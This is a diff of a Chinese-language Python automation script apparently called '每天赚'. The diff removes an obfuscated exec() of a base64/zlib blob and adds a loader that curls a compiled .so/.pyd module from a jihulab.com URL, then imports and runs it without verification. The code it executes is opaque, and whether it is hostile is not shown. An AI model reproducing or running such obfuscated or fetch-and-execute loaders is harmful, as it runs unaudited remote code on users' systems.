@@ -1,7 +1,76 @@
 """
 new Env('每天赚');
+cron: 6 6 6 6 6
 先运行脚本，有问题到群里问 http://t.me/xiaoymgroup
 """
-import zlib
-import base64
-exec(zlib.decompress(base64.b64decode("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")))
+
+import platform
+import sys
+import os
+import subprocess
+
+
+def check_environment(file_name):
+    python_info, os_info, cpu_info = sys.version_info, platform.system().lower(), platform.machine().lower() 
+    print(f"Python版本: {python_info.major}.{python_info.minor}.{python_info.micro}, 操作系统类型: {os_info}, 处理器架构: {cpu_info}")
+    if (python_info.minor in [10]) and os_info in ['linux','windows'] and cpu_info in ['x86_64', 'aarch64', 'armv8','amd64']:
+        print("符合运行要求,arm8没试过不知道行不行")
+        check_so_file(file_name, os_info,cpu_info)
+    else:
+        if not (python_info.minor in [10]):
+            print("不符合要求: Python版本不是3.10")
+        if cpu_info not in ['x86_64', 'aarch64', 'armv8','amd64']:
+            print("不符合要求: 处理器架构不是x86_64 aarch64 armv8 amd64")
+
+
+def check_so_file(filename,sys_info, cpu_info):
+    if sys_info == 'windows':
+        filename=os.path.splitext(filename)[0]+'.pyd'
+    if sys_info == 'linux':
+        filename = os.path.splitext(filename)[0]+'.so'
+    if os.path.exists(filename):
+        print(f"{filename} 存在")
+        import mtz 
+        mtz.main()
+    else:
+        print(f"不存在{filename}文件,准备下载文件")
+        url = f'https://jihulab.com/xizhiai/xiaoym/-/raw/main/{os.path.splitext(filename)[0]}'
+        download_so_file(filename, sys_info, cpu_info,main_url=url)
+
+def run_command(command):
+    process = subprocess.Popen(
+        command,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT, 
+        text=True  
+    )
+    for line in process.stdout:
+        line = line.strip()
+        if "%" in line:
+            print(line)
+    process.wait()
+    return process.returncode
+
+
+def download_so_file(filename, sys_info, cpu_info, main_url):
+    file_base_name = os.path.splitext(filename)[0]
+    if sys_info == 'windows':
+        url = main_url + f'/{file_base_name}.{cpu_info}_{sys_info}.pyd'
+    if sys_info == 'linux':
+        url = main_url + f'/{file_base_name}.{cpu_info}_{sys_info}.so'
+    print(url)
+    # print(github_url)
+    # 您的命令，使用 -# 参数显示下载进度
+    command = ['curl', '-#', '-o', filename, url]
+    # 执行命令并处理输出
+    result = run_command(command)
+    if result == 0:
+        print(f"下载完成：{filename},调用check_so_file funtion")
+        check_so_file(filename,sys_info,cpu_info)
+    else:        
+        print(f"下载失败：{filename}")
+            
+
+if __name__ == '__main__':
+    check_environment('mtz.so')
+
